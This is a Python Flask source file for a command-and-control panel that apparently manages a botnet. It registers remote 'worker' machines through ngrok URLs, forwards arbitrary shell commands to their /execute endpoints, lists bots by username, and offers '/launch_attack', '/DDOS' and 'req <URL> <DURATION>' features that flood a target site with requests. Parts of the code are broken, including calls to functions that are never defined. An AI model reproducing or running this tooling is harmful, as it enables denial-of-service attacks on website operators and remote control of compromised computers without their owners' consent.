from flask import Flask, render_template, request, jsonify
import requests
import os
import signal
import time

app = Flask(__name__)

# Global variables
ngrok_urls = []
bot_username = "Unknown_user"  # Assign your bot's username here

# Function to get the username of a worker
def get_username(url):
    endpoint = f"{url}/get_username"
    try:
        response = requests.get(endpoint)
        response.raise_for_status()
        username = response.json().get('username', 'Unknown User')
        return username
    except requests.exceptions.RequestException as e:
        print(f"Failed to get username from {url}. Error: {e}")
        return None

# Function to send command to a worker
def send_command_to_worker(ngrok_url, command):
    endpoint = f"{ngrok_url}/execute"
    try:
        response = requests.post(endpoint, json={'command': command})
        response.raise_for_status()  
        return response.json().get('result', 'No result received')
    except requests.exceptions.RequestException as e:
        return f"Failed to send command to {ngrok_url}. Error: {e}"

# Function to launch requests
def launch_requests(url, duration):
    end_time = time.time() + duration
    responses = []
    
    while time.time() < end_time:
        for ngrok_url in ngrok_urls:
            try:
                response = requests.get(url)  # Send a GET request to the target URL
                responses.append(f"Response from {ngrok_url}: {response.status_code}")
            except Exception as e:
                responses.append(f"Failed to send request to {ngrok_url}: {e}")
    
    return responses

# Home page
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/map')
def map():
    return render_template('map.html')

@app.route('/script_generator')
def script_generator():
    return render_template('gen.html')


# Endpoint to set ngrok URLs
@app.route('/set_ngrok', methods=['POST'])
def set_ngrok():
    global ngrok_urls
    ngrok_urls = request.form['ngrok_urls'].split(',')
    ngrok_urls = [url.strip() for url in ngrok_urls]  # Clean whitespace
    return jsonify(message="ngrok URLs updated successfully.")

# Endpoint to send command
@app.route('/send_command', methods=['POST'])
def send_command():
    global bot_username
    command = request.form['command']
    results = []

    if command.lower().startswith("req "):
        try:
            parts = command.split()  # Split the command into parts
            target_url = parts[1]    # Extract the target URL
            duration = int(parts[2])  # Extract the duration in seconds
            
            # Launch requests to the target URL for the specified duration
            responses = launch_requests(target_url, duration)
            results.extend(responses)
        except (IndexError, ValueError):
            return jsonify(results=["Invalid command format. Use: req <URL> <DURATION>"]), 400

    elif command.lower() == "update_username":
        for ngrok_url in ngrok_urls:
            current_username = get_username(ngrok_url)
            if current_username:
                bot_username = current_username  # Update the bot's username
                result = update_username(ngrok_url, bot_username)
                results.append(f"Response from {ngrok_url}: {result}")
                
    elif command.lower() == "update_coordinates":
        for ngrok_url in ngrok_urls:
            coordinates = get_coordinates(ngrok_url)
            
            

    else:
        for ngrok_url in ngrok_urls:
            result = send_command_to_worker(ngrok_url, command)
            results.append(f"Response from {ngrok_url}: {result}")

    return jsonify(results=results)

# Launch attack endpoint
@app.route('/launch_attack', methods=['POST'])
def launch_attack():
    data = request.json
    url = data.get('url')
    duration = data.get('duration')

    # Here you would implement the logic to launch the attack.
    # Simulating an attack by sending GET requests to the target URL.
    end_time = time.time() + int(duration)

    while time.time() < end_time:
        try:
            requests.get(url)  # Replace with your attack logic
        except Exception as e:
            print(f"Failed to send request to {url}: {e}")

    return jsonify(message="Attack launched"), 200

@app.route('/DDOS')
def ddos_page():
    return render_template('ddos.html')

@app.route('/status')
def status_page():
    return render_template('status.html')


# Route for the bots page
@app.route('/bots')
def bots():
    # Create a dictionary mapping each ngrok URL to its username
    bots = {url: get_username(url) for url in ngrok_urls}
    return render_template('bots.html', bots=bots)  # Pass the bots dictionary to the template

# Endpoint to remove a URL
@app.route('/remove_url', methods=['POST'])
def remove_url():
    global ngrok_urls
    data = request.get_json()
    url_to_remove = data.get('url')

    if url_to_remove in ngrok_urls:
        ngrok_urls.remove(url_to_remove)  # Remove the URL from the list
        return jsonify(message="URL removed successfully."), 200
    else:
        return jsonify(message="URL not found."), 404

@app.route('/shutdown', methods=['POST'])
def shutdown():
    signal.signal(signal.SIGINT, signal.SIG_DFL)  # Allow the program to be killed
    os.kill(os.getpid(), signal.SIGINT)
    return jsonify(message="Shutting down the server.")

if __name__ == '__main__':
    app.run(debug=True)
